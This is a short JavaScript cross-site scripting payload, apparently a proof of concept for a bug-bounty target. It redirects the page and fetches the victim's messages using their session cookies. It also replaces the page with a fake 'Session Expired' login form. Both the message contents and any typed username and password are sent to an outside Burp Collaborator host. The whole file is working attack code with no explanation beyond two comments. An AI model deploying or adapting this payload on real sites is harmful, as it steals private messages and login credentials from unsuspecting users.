// Redirect victim out of the app
window.top.location = "https://zerocopter.com/";

// Steal inbox/messages (adjust endpoint to something valid on target)
fetch("/messages/c0a634866745", { credentials: "include" })
  .then(r => r.text())
  .then(t => {
    fetch("https://907kocpfvd3dgpex2ok446r9e0kq8f.burpcollaborator.net/inbox?d=" + btoa(t));
  });

(function fakeForm() {
  let form = document.createElement("form");
  form.innerHTML = `
    <h2>Session Expired - Please Login Again</h2>
    <input type="text" id="user" placeholder="Username"><br><br>
    <input type="password" id="pass" placeholder="Password"><br><br>
    <button type="button" id="send">Login</button>
  `;
  Object.assign(form.style, {
    position: "fixed", top: "30%", left: "40%", padding: "20px",
    background: "#fff", border: "2px solid black", "z-index": 1000000
  });
  document.body.innerHTML = "";
  document.body.appendChild(form);

  form.querySelector("#send").onclick = () => {
    fetch("https://907kocpfvd3dgpex2ok446r9e0kq8f.burpcollaborator.net/creds?u=" +
          encodeURIComponent(form.querySelector("#user").value) +
          "&p=" + encodeURIComponent(form.querySelector("#pass").value));
    alert("Credentials submitted!");
  };
})();
